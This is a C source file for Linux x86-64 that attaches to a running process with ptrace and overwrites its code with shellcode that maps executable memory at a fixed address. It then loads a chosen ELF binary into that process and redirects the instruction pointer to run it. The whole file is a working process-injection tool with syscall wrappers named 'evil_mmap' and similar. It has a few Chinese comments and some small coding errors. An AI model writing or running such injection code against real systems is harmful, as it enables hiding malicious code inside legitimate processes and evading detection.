#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define PAGE_ALIGN(x) ( x & ~(PAGE_SIZE-1))
#define PAGE_ALIGN_UP(x) ( PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ( (x+7) & ~7)
#define BASE_ADDRESS 0x00100000

typedef struct handle {
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    uint8_t *mem;
    pid_t pid;
    uint8_t *shellcode;
    char *exec_path;
    uint64_t base;
    uint64_t stack;
    uint64_t entry;
    struct user_regs_struct pt_reg;
}handle_t;

static inline volatile void* evil_mmap(void *, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) __attribute__((aligned(8),__always_inline__));
uint64_t injection_code(void *)__attribute__((aligned(8)));
uint64_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);
uint8_t* create_fn_shellcode(void* fn, size_t len);

void *f1 = (void*)injection_code;
void *f2 = (void*)get_text_base;

static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdi\n"
        "mov $1, %%rax\n"
        "syscall"::"g"(fd),"g"(buf),"g"(len)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile int evil_fstat(long fd,  struct stat *buf) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $5, %%rax\n"
        "syscall"::"g"(fd),"g"(buf)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile int evil_open(const char *path, unsigned long flags) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $2, %%rax\n"
        "syscall"::"g"(path),"g"(flags)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile void* evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, uint64_t fd, uint64_t off) {
    long mmap_fd = fd;
    unsigned long mmap_off = off;
    unsigned long mmap_flags = flags;
    unsigned long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%r10\n"
        "mov %4, %%r8\n"
        "mov %5, %%r9\n"
        "mov $9, %%rax\n"
        "syscall"::"g"(addr),"g"(len),"g"(prot),"g"(flags),"g"(mmap_fd),"g"(mmap_off)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return (void *)ret;
}

uint64_t injection_code(void *vaddr)
{
    volatile void *mem;
    /** 
     *  Don't  interpret  addr  as a hint: place the mapping at exactly that address.  addr must be a multiple of the page size.
     * If the memory region specified by addr and len overlaps pages of any existing mapping(s), then the overlapped part of the 
     * existing mapping(s) will be discarded.  If the specified address cannot be used, mmap() will fail.  Because requiring a fixed 
     * address for a mapping is less portable, the use of this option is discouraged.   
     *  
     */
    mem = evil_mmap(vaddr, 8192, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 1, 0);
    __asm__ __volatile__("int3");
}

#define MAX_PATH 512

uint64_t get_text_base(pid_t pid)
{
    char maps[MAX_PATH], line[256];
    char *start, *p;
    FILE *fd;
    int i;
    Elf64_Addr base;
    snprintf(maps, MAX_PATH - 1, "/proc/%d/maps", pid);
    if((fd=fopen(maps, "r"))==NULL) {
        fprintf(stderr, "cannot open %s for reading: %s\n", maps, strerror(errno));
        return 1;
    }
    while(fgets(line, sizeof(line), fd)) {
        if(!strstr(line,"r-xp")) {
            continue;
        }
        /**
         * alloca在栈上临时开辟空间
         */
        for(i = 0, start = (char*)alloca(32), p = line; *p != ' ';i++,p++) {
            start[i] = *p;
        }
        start[i] = '\0';
        base = strtoul(start, NULL, 16);
        break;
    }
    fclose(fd);
    return base;
}

uint8_t* create_fn_shellcode(void* fn, size_t len) {
    size_t i;
    uint8_t *shellcode = (uint8_t *)malloc(len);
    uint8_t *p = (uint8_t *)fn;
    for(i = 0; i < len;i++) {
        *(shellcode + i) = *p++;
    }
    return shellcode;
}

int pid_read(int pid,  void *dst,  const void *src, size_t len) {
    /**
     * PTRACE_PEEKTEXT每次读取word大小数据
     */
    int sz = len / sizeof(void *);
    unsigned char *s = (unsigned char *)src;
    unsigned char *d = (unsigned char *)dst;
    long word;
    while(sz!=0) {
        word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
        if(word==1&&errno) {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            goto fail;
        }
        *(long *)d = word;
        s += sizeof(long);
        d += sizeof(long);
        sz--;
    }
    return 0;
fail:
    perror("PTRACE_PEEKTEXT");
    return -1;
}

int pid_write(int pid,  void *dst,  const void *src, size_t len) {
    size_t quot = len / sizeof(void *);
    unsigned char *s = (unsigned char *)src;
    unsigned char *d = (unsigned char *)dst;
    while(quot!=0) {
        if(ptrace(PTRACE_POKETEXT, pid, d, *(void**)s)==1) {
            goto out_error;
        }
        s += sizeof(void *);
        d += sizeof(void *);
        quot--;
    }
    return 0;
out_error:
    perror("PTRACE_POKETEXT");
    return -1;
}

int main(int argc,  char **argv) {
    handle_t h;
    unsigned long shellcode_size = (uint64_t)f2 - (uint64_t)f1;
    int i,fd,status;
    uint8_t* executable,*origcode;
    struct stat st;
    Elf64_Ehdr *ehdr;
    if(argc<3) {
        printf("Usage: %s <pid> <executable>\n", argv[0]);
        exit(1);
    }
    h.pid = atoi(argv[1]);
    h.exec_path = strdup(argv[2]);
    if(ptrace(PTRACE_ATTACH, h.pid,NULL,NULL)<0) {
        perror("PTRACE_ATTACH");
        exit(1);
    }
    wait(NULL);
    h.base = get_text_base(h.pid);
    printf("pid: %d  base: %lx\n", h.pid, h.base);
    shellcode_size += 8;
    printf("shellcode_size: %ld\n", shellcode_size);
    h.shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);
    origcode = (uint8_t*)alloca(shellcode_size);
    if(pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size)<0) {
        exit(1);
    }
    if(pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size)<0) {
        exit(1);
    }
    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg)<0) {
        perror("PTRACE_GETREGS");
        exit(1);
    }
    /**
     * 设置rip为shellcode起始地址开始运行
     */
    h.pt_reg.rip = h.base;
    h.pt_reg.rdi = BASE_ADDRESS;
    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg)<0) {
        fprintf(stderr, "line: %d error:PTRACE_SETREGS\n",__LINE__);
        perror("1111111 PTRACE_SETREGS");
        exit(1);
    }
    /**
     * tracee continue run
     */
    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {
        fprintf(stderr, "line: %d error:PTRACE_CONT\n", __LINE__);
        exit(1);
    }
    wait(&status);
    if(WSTOPSIG(status)!=SIGTRAP) {
        printf("something went wrong\n");
        exit(1);
    }
    printf("shellcode inject 1\n");
    if(pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size)<0) {
        exit(1);
    }
    if((fd = open(h.exec_path, O_RDONLY))<0) {
        perror("open");
        exit(1);
    }
    
    if(fstat( fd, &st)<0) {
        perror("stat");
        exit(1);
    }
    executable = (uint8_t*)malloc(WORD_ALIGN(st.st_size));
    if(read(fd, executable, st.st_size)<0) {
        perror("read");
        exit(1);
    }
    for(int i = 0; i < sizeof(Elf64_Ehdr);++i) {
        if(i%16==0) {
            printf("\n");
        }
        printf("%02x ", executable[i]);
    }
    ehdr = (Elf64_Ehdr *)executable;
    h.entry = ehdr->e_entry;
    printf("payload entry:0x%lx\n", ehdr->e_entry);
    close(fd);
    if(pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size)<0) {
        fprintf(stderr,"%d pid_write: pid:%d address:%lx\n", __LINE__, h.pid, BASE_ADDRESS);
        exit(1);
    }
    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_GETREGS");
        exit(1);
    }
    
    h.entry = BASE_ADDRESS + h.entry;
    h.pt_reg.rip = h.entry;
    printf("new_entry: 0x%lx\n", h.entry);
    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_SETREGS");
        exit(1);
    }
    
    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL)<0) {
        perror("PTRACE_DETACH");
        exit(1);
    }
    wait(NULL);
    exit(0);
}


